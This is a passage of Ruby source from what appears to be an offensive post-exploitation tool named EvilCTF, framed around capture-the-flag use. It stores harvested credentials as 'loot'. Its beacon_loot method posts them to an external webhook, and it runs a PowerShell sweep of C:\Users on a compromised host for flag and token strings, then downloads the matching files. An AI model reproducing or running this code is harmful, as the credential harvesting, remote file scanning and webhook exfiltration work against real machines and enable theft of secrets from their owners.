        end
      end
      json_loot = if File.exist?('loot/creds.json')
                    JSON.parse(File.read('loot/creds.json'))
                  else
                    []
                  end
      json_loot += matches.select { |m| m.is_a?(String) && m.start_with?('{') }
      json_loot = json_loot.uniq
      File.write('loot/creds.json', JSON.pretty_generate(json_loot))
    rescue Errno::ENOSPC => e
      puts "[!] No space left on device for loot saving: #{e.message}"
    rescue => e
      puts "[!] Save loot failed: #{e.message}"
    end
  end
  def self.beacon_loot(webhook, matches)
    # Fixed beacon_loot to handle empty matches properly
    return if matches.nil? || matches.empty? || webhook.nil?
    uri = URI(webhook)
    req = Net::HTTP::Post.new(uri)
    req['Content-Type'] = 'application/json'
    req.body = { loot: matches }.to_json
    Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
      http.request(req)
    end
  rescue => e
    puts "[!] Beacon failed: #{e.message}"
  end
 
  def self.find_tool_on_disk(tool_key)
    tool = TOOL_REGISTRY[tool_key]
    return nil unless tool

    search_patterns = tool[:search_patterns] || [tool[:filename]]
    base_dirs = [
      ENV['HOME'],
      File.join(ENV['HOME'], 'Downloads'),
      File.join(ENV['HOME'], 'Desktop'),
      File.join(ENV['HOME'], 'tools'),
      File.join(ENV['HOME'], 'bin'),
      Dir.pwd,
      File.join(Dir.pwd, 'tools')
    ].compact.uniq

    search_patterns.each do |pattern|
      base_dirs.each do |base|
        next unless Dir.exist?(base)
        # Use find with max depth 3
        Dir.glob(File.join(base, '**', pattern), File::FNM_CASEFOLD).each do |path|
          return path if File.file?(path)
        end
      end
    end
    nil
  end
  def self.get_system_architecture(shell)
    result = shell.run('$env:PROCESSOR_ARCHITECTURE')
    arch = result.output.strip
   
    if arch.include?('64')
      'x64'
    elsif arch.include?('86')
      'x86'
    else
      'unknown'
    end
  end
  

  def self.load_config_profile(name)
    profile_file = File.join('config', "#{name}.yaml")
    return {} unless File.exist?(profile_file)
    YAML.safe_load(File.read(profile_file)) || {}
  rescue => e
    puts "[!] Failed to load profile #{name}: #{e.message}"
    {}
  end
  def self.save_config_profile(name, options)
    profile_file = File.join('config', "#{name}.yaml")
    FileUtils.mkdir_p(File.dirname(profile_file))
   
    File.write(profile_file, YAML.dump(options))
    puts "[+] Profile saved to #{profile_file}"
  rescue => e
    puts "[!] Failed to save profile: #{e.message}"
  end
  # loot_show as per review
  def self.loot_show
    loot_dir = 'loot/'
    files = Dir.glob("#{loot_dir}**/*").select { |f| File.file?(f) }
    puts "Loot Items: #{files.count}"
    files.each { |f| puts "#{f.sub(loot_dir, '')} (#{File.size(f)} bytes)" }
  end
  # New method for automatic flag scan and download
  def self.auto_download_flags(shell)
    # Use regex to find flag patterns
    patterns = [
      /flag\{[^\}]+\}/i,
      /picoctf\{[^\}]+\}/i,
      /htb\{[^\}]+\}/i,
      /ctf\{[^\}]+\}/i,
      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i
    ]

  # Use Get-ChildItem with -Recurse and -Filter
    ps = <<~PS
      $patterns = #{patterns.map(&:source).to_json}
      $files = Get-ChildItem -Path "C:\\Users" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $_.Length -gt 0 -and $_.Name -notmatch "^\." 
      }
      $found = @()
      foreach ($file in $files) {
        try {
          $content = Get-Content $file.FullName -Raw
          $matches = $content | Select-String -Pattern $patterns -AllMatches
          if ($matches) {
            $flag = $matches.Matches | ForEach-Object { $_.Value }
            $found += [PSCustomObject]@{
              Path = $file.FullName
              Content = $flag -join '; '
            }
          }
        } catch {}
      }
      $found | ConvertTo-Json -Depth 5
    PS

    begin
      result = shell.run(ps)
      data = JSON.parse(result.output)
      data.each do |f|
        puts "\n[+] Found flag: #{f['Path']}"
        puts f['Content']
        # Save to loot
        local_path = "loot/#{File.basename(f['Path'])}"
        EvilCTF::Uploader.download_file(f['Path'], local_path, shell)
      end
    rescue => e
      puts "[!] Flag scan failed: #{e.message}"
    end
  end

end
